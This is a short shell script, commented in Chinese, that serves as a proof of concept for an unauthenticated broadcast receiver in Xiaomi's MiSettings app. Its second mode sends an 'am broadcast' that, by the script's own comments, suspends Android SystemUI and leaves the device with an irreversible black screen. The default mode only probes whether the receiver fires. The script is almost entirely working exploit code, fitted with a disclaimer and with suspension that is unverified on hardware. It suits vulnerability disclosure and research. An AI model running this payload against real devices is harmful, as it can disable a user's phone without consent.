#!/bin/sh
# poc_shell.sh — MisSettings AppTimerReceiver 无鉴权广播 PoC（shell 版演示）
# 用法: sh poc_shell.sh [0|1]
#   0 (默认): 只发送"触发 receiver"的 action（不挂起），检测 receiver 是否触发
#   1       : 发送 SCHEDULE_PROLONG_LIMIT_TIME + pkgName=systemui（★ 会挂起 systemui → 黑屏，不可逆，勿用）
# ⚠ 免责声明: 仅安全研究，勿在未授权/他人/生产设备运行。挂起=静态推断未真机验证。运行前备份数据。

DO_SUSPEND=${1:-0}
PKG=com.xiaomi.misettings
RECV=com.xiaomi.misettings.usagestats.AppTimerReceiver
TARGET=com.android.systemui

if [ "$DO_SUSPEND" = "1" ]; then
    echo "[!] 发送挂起广播: $PKG/$RECV -> $TARGET （不可逆，确认已备份、旧版本、自有设备！）"
    am broadcast -n "$PKG/$RECV" \
        -a miui.intent.action.settings.SCHEDULE_PROLONG_LIMIT_TIME \
        --es pkgName "$TARGET"
else
    echo "[*] 发送触发广播（SCHEDULE_DEVICE_USAGE_MONITOR，不挂起）"
    am broadcast -n "$PKG/$RECV" \
        -a miui.intent.action.settings.SCHEDULE_DEVICE_USAGE_MONITOR \
        --ez key_modify_notification_text false
fi

sleep 3
echo "[*] 目标 $TARGET 状态:"
dumpsys package "$TARGET" 2>/dev/null | grep -iE 'suspended' | head -3
echo "[*] 检查 logcat（AppTimerReceiver 是否触发）:"
logcat -d -t 20 2>/dev/null | grep -iE 'AppTimerReceiver|DeviceUsage' | tail -5
